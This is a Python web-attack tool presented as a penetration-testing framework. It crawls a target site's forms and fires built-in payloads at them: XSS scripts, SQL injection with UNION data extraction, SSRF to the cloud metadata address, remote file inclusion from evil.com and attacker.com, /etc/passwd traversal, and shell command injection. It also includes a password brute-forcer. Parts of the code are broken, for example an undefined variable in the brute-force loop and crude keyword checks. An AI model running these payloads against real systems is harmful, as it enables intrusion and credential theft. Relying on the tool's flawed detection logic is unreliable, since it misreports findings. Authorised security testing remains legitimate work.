######################################################################################################################################################################################################################
# Python script for possible vulnerabilities in a web application, and does not constitute or replace a robust vulnerability scanner or manual testing. Note: Be mindful of the scope of work, & rules of engagement, script also requires BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/. .
# python web_security_framework.py. Requires a linux virtual environment for older python version funtionality, pip restrictions for external dependancies, and reducing conflicts. Placeholders now in place for payload lists.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# Replace teaget_url with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
######################################################################################################################################################################################################################

import requests
from bs4 import BeautifulSoup
import os
import matplotlib.pyplot as plt
from urllib.parse import urlparse, urljoin, quote
import base64
import html

# Banner
def print_banner():
    banner = r"""
    
 __      __        ___.             _____                  .__   .__                  __  .__                       _________                           .__   __                ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
/  \    /  \  ____ \_ |__          /  _  \ ______  ______  |  |  |__|  ____  _____  _/  |_|__| ____   ____         /   _____/ ____   ____   __ _________|__|_/  |_  ___.__.     \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /_/ __ \ | __ \        /  /_\  \\____ \ \____ \ |  |  |  |_/ ___\ \__  \ \   __\  |/  _ \ /    \        \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        / \  ___/ | \_\ \      /    |    \  |_> >|  |_> >|  |__|  |\  \___  / __ \_|  | |  (  <_> )   |  \       /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  /   \___  >|___  /______\____|__  /   __/ |   __/ |____/|__| \___  >(____  /|__| |__|\____/|___|  /______/_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
       \/        \/     \//_____/        \/|__|    |__|                   \/      \/                     \//_____/        \/     \/     \/                          \/    /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/  

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |
    
    """
    print(banner)

# Log function to keep track of test results
def log_result(test_type, result, message, url, field=None):
    field_info = f" | Field: {field}" if field else ""
    with open("penetration_testing_report.txt", "a") as log_file:
        log_file.write(f"{test_type}: {result} - {message} | URL: {url}{field_info}\n")
    print(f"{test_type}: {result} - {message} | URL: {url}{field_info}")

# Check if link is within the target domain
def is_within_domain(base_url, link):
    base_domain = urlparse(base_url).netloc
    link_domain = urlparse(urljoin(base_url, link)).netloc
    return base_domain == link_domain

# Crawl Website for Forms and Hidden Forms
def crawl_for_forms(url, visited=None):
    if visited is None:
        visited = set()
    if url in visited:
        return visited
    visited.add(url)
    print(f"Crawling URL for forms: {url}")
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        log_result("Crawl", "Error", f"Error crawling {url}: {e}", url)
        return []
    
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    
    form_details_list = []
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        
        form_details = {
            'action': action,
            'method': method,
            'inputs': {input_tag.get('name'): input_tag.get('type', 'text') for input_tag in inputs}
        }
        log_result("Form Found", "Info", str(form_details), url)
        form_details_list.append(form_details)
    
    return form_details_list

# Obfuscate payloads using different methods
def obfuscate_payload(payload):
    return [
        payload,  # Original payload
        base64.b64encode(payload.encode()).decode(),  # Base64 encoding
        quote(payload),  # URL encoding
        html.escape(payload)  # HTML entity encoding
    ]

# Load payloads from file
def load_payloads_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            payloads = [line.strip() for line in file.readlines()]
        return payloads
    except IOError:
        print(f"Error reading file '{file_path}'. Please check the file path and try again.")
        return None

# XSS Testing for both stored and reflected XSS
def xss_test(url, payloads):
    forms = crawl_for_forms(url)
    
    def check_response(response, payload):
        if payload in response.text:
            return True
        # Additional header check
        for header in response.headers.values():
            if payload in header:
                return True
        return False
    
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']
        
        for payload in payloads:
            obfuscated_payloads = obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)
                
                if check_response(response, payload):
                    log_result("XSS Test", "Vulnerable", f"XSS vulnerability detected with payload {payload}", url, action)
                    return
    log_result("XSS Test", "Not Vulnerable", f"No XSS vulnerability detected", url)

# SQL Injection Testing for both parameters and headers
def sql_injection_test(url, payloads):
    forms = crawl_for_forms(url)
    modulating_payloads = [
        "' UNION SELECT 1,2,3,4,5,6,concat(database(),system_user(),@@version)-- -",
        "' UNION SELECT NULL, NULL, NULL, NULL, NULL, concat(database(), system_user(), @@version)-- -"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": "http://example.com",
        "X-Forwarded-For": "127.0.0.1"
    }
    
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']
        
        for payload in payloads:
            obfuscated_payloads = obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)
                
                if "error" in response.text.lower() or "mysql" in response.text.lower():
                    log_result("SQL Injection Test", "Vulnerable", f"SQL Injection vulnerability detected with payload {payload}", url, action)
                    # Test modulating payloads
                    for mod_payload in modulating_payloads:
                        mod_obfuscated_payloads = obfuscate_payload(mod_payload)
                        for mod_obfuscated_payload in mod_obfuscated_payloads:
                            data = {key: mod_obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                            if method == 'post':
                                response = requests.post(urljoin(url, action), data=data)
                            else:
                                response = requests.get(urljoin(url, action), params=data)
                            if "database" in response.text.lower() or "version" in response.text.lower():
                                log_result("SQL Injection Test", "Vulnerable", f"Modulating SQL Injection payload executed: {mod_payload}", url, action)
                                return
    
    log_result("SQL Injection Test", "Not Vulnerable", f"No SQL Injection vulnerability detected", url)

# SSRF Testing
def ssrf_test(url, payloads):
    forms = crawl_for_forms(url)
    modulating_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/admin"
    ]
    
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']
        
        for payload in payloads:
            obfuscated_payloads = obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)
                
                if "error" in response.text.lower():
                    log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected with payload {payload}", url, action)
                    # Test modulating payloads
                    for mod_payload in modulating_payloads:
                        mod_obfuscated_payloads = obfuscate_payload(mod_payload)
                        for mod_obfuscated_payload in mod_obfuscated_payloads:
                            data = {key: mod_obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                            if method == 'post':
                                response = requests.post(urljoin(url, action), data=data)
                            else:
                                response = requests.get(urljoin(url, action), params=data)
                            if any(keyword in response.text.lower() for keyword in ["meta-data", "admin"]):
                                log_result("SSRF Test", "Vulnerable", f"Modulating SSRF payload executed: {mod_payload}", url, action)
                                return
    log_result("SSRF Test", "Not Vulnerable", f"No SSRF vulnerability detected", url)

# RFI Testing
def rfi_test(url, payloads):
    forms = crawl_for_forms(url)
    
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']
        
        for payload in payloads:
            obfuscated_payloads = obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)
                
                if "error" in response.text.lower():
                    log_result("RFI Test", "Vulnerable", f"RFI vulnerability detected with payload {payload}", url, action)
                    return
    log_result("RFI Test", "Not Vulnerable", f"No RFI vulnerability detected", url)

# LFI Testing
def lfi_test(url, payloads):
    forms = crawl_for_forms(url)
    
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']
        
        for payload in payloads:
            obfuscated_payloads = obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)
                
                if "root" in response.text:
                    log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected with payload {payload}", url, action)
                    return
    log_result("LFI Test", "Not Vulnerable", f"No LFI vulnerability detected", url)

# Command Injection Testing
def command_injection_test(url, payloads):
    forms = crawl_for_forms(url)
    
    def check_response(response):
        keywords = ["uid=", "root", "Linux", "id", "whoami"]
        for keyword in keywords:
            if keyword in response.text:
                return True
        return False
    
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']
        
        for payload in payloads:
            obfuscated_payloads = obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)
                
                if check_response(response):
                    log_result("Command Injection Test", "Vulnerable", f"Command injection detected with payload {payload}", url, action)
                    return
    log_result("Command Injection Test", "Not Vulnerable", f"No command injection detected", url)

# Header Injection Testing
def header_injection_test(url, payloads):
    forms = crawl_for_forms(url)
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": "http://example.com",
        "X-Forwarded-For": "127.0.0.1"
    }
    
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']
        
        for field in headers:
            for payload in payloads:
                obfuscated_payloads = obfuscate_payload(payload)
                for obfuscated_payload in obfuscated_payloads:
                    modified_headers = headers.copy()
                    modified_headers[field] += obfuscated_payload
                    response = requests.get(urljoin(url, action), headers=modified_headers)
                    if "X-Test: injected-header" in response.text:
                        log_result("Header Injection Test", "Vulnerable", f"Header injection detected with payload {payload}", url, action)
                        return
    log_result("Header Injection Test", "Not Vulnerable", f"No header injection detected", url)

# Brute Force Testing for Login Forms
def brute_force_test(url, username, wordlist, payloads):
    forms = crawl_for_forms(url)
    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            obfuscated_passwords = obfuscate_payload(password)
            for obfuscated_password in obfuscated_payloads:
                for form in forms:
                    action = form['action']
                    method = form['method']
                    data = {key: obfuscated_password if key == 'password' else username for key in form['inputs'].keys()}
                    response = requests.post(urljoin(url, action), data=data)
                    if "login successful" in response.text:
                        log_result("Brute Force Test", "Vulnerable", f"Found valid credentials: {username}/{password}", url, action)
                        return

# Session Handling for Login Automation
def login(url, username, password):
    session = requests.Session()
    obfuscated_passwords = obfuscate_payload(password)
    for obfuscated_password in obfuscated_passwords:
        login_data = {"username": username, "password": obfuscated_password}
        try:
            response = session.post(url, data=login_data)
            response.raise_for_status()
            if response.status_code == 200:
                log_result("Login", "Success", f"Login successful with {username}/{password}", url, "password")
                return session
        except requests.exceptions.RequestException as e:
            log_result("Login", "Failure", f"Login failed with {username}/{password} - {e}", url, "password")
    return None

# API Testing (e.g., POST or GET requests)
def api_test(url, method="GET", data=None):
    if method == "GET":
        response = requests.get(url, params=data)
    elif method == "POST":
        response = requests.post(url, json=data)
    if response.status_code != 200:
        log_result("API Test", "Vulnerable", f"API issue found. Status: {response.status_code}", url)
    else:
        log_result("API Test", "Not Vulnerable", f"API test passed", url)

# Generate a Summary Chart of Results
def generate_report_chart():
    labels = ['Vulnerable', 'Not Vulnerable', 'Info']
    counts = [0, 0, 0]  # Counts for each result type

    with open("penetration_testing_report.txt", "r") as log_file:
        logs = log_file.readlines()
        counts[0] = sum(1 for log in logs if "Vulnerable" in log)
        counts[1] = sum(1 for log in logs if "Not Vulnerable" in log)
        counts[2] = sum(1 for log in logs if "Info" in log)

    plt.bar(labels, counts, color=['red', 'green', 'yellow'])
    plt.title("Vulnerability Test Results")
    plt.ylabel("Count")
    plt.savefig("vulnerability_report_chart.png")
    plt.show()

# Menu and Submenu system
def display_menu():
    print("\nPenetration Testing Menu:")
    print("1. Crawl Website     2. XSS Testing        3. SQL Injection Testing")
    print("4. SSRF Testing      5. RFI Testing        6. LFI Testing")
    print("7. Command Injection 8. Header Injection   9. Brute Force Testing")
    print("10. Session Handling 11. API Testing       12. Generate Report")
    print("13. Exit")

def display_payload_menu():
    print("\nPayload Options:")
    print("1. Load payloads from file")
    print("2. Use default payloads")

def handle_menu_choice(choice):
    target_url = input("Enter target URL: ")
    payloads = []
    
    if choice in [2, 3, 4, 5, 6, 7, 8, 9]:
        display_payload_menu()
        payload_choice = int(input("Enter your choice: "))
        if payload_choice == 1:
            while True:
                file_path = input("Enter the path to the payload file: ")
                payloads = load_payloads_from_file(file_path)
                if payloads is not None:
                    break
        else:
            if choice == 2:
                payloads = [
                    "<script>alert('XSS');</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<body onload=alert('XSS')>",
                    "<svg/onload=alert('XSS')>",
                    "\";alert('XSS');//",
                    "';alert('XSS');",
                    "<iframe src=javascript:alert('XSS')>",
                    "<math><mi><mo><mtext><mn><ms><mtext><mglyph><malignmark><maligngroup><ms><mtext>&lt;script&gt;alert('XSS')&lt;/script&gt;</mtext></ms></maligngroup></malignmark></mglyph></mn></mtext></mo></mi></math>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                ]
            elif choice == 3:
                payloads = [
                    "' OR '1'='1",
                    "' OR '1'='1' --",
                    "' OR '1'='1' /*",
                    "' OR 1=1 --"
                ]
            elif choice == 4:
                payloads = [
                    "http://localhost:8080",
                    "http://127.0.0.1:8080",
                    "http://169.254.169.254"
                ]
            elif choice == 5:
                payloads = [
                    "http://example.com/malicious_file",
                    "http://evil.com/evil_script",
                    "http://attacker.com/backdoor"
                ]
            elif choice == 6:
                payloads = [
                    "../../../../etc/passwd",
                    "../../../../../etc/passwd",
                    "../../../../../../etc/passwd"
                ]
            elif choice == 7:
                payloads = [
                    "id; ls",
                    "whoami; cat /etc/passwd",
                    "uname -a; ls -la",
                    "`id`",
                    "$(id)",
                    "`uname -a`",
                    "&& whoami",
                    "|| uname -a",
                    "| id",
                    ";& id",
                    "|& id",
                    "%0A id",
                    "%0A uname -a"
                ]
            elif choice == 8:
                payloads = [
                    "\r\nX-Test: injected-header",
                    "\nX-Test: injected-header",
                    "%0d%0aX-Test: injected-header",
                    "%0aX-Test: injected-header"
                ]

    if choice == 1:
        crawl_for_forms(target_url)
    elif choice == 2:
        xss_test(target_url, payloads)
    elif choice == 3:
        sql_injection_test(target_url, payloads)
    elif choice == 4:
        ssrf_test(target_url, payloads)
    elif choice == 5:
        rfi_test(target_url, payloads)
    elif choice == 6:
        lfi_test(target_url, payloads)
    elif choice == 7:
        command_injection_test(target_url, payloads)
    elif choice == 8:
        header_injection_test(target_url, payloads)
    elif choice == 9:
        username = input("Enter username for brute force/login (if applicable): ")
        wordlist = input("Enter wordlist file path (if applicable): ")
        brute_force_test(target_url, username, wordlist, payloads)
    elif choice == 10:
        username = input("Enter username for login: ")
        password = input("Enter password for login: ")
        session = login(target_url, username, password)
        if session:
            log_result("Session Handling", "Info", f"Logged in with {username}", target_url, "password")
    elif choice == 11:
        api_test(target_url)
    elif choice == 12:
        generate_report_chart()
    elif choice == 13:
        print("Exiting...")
        exit()

# Main function to run the menu-driven program
def main():
    print_banner()
    while True:
        display_menu()
        try:
            choice = int(input("Enter your choice: "))
            handle_menu_choice(choice)
        except ValueError:
            print("Invalid input. Please enter a number between 1 and 13.")

if __name__ == "__main__":
    main()
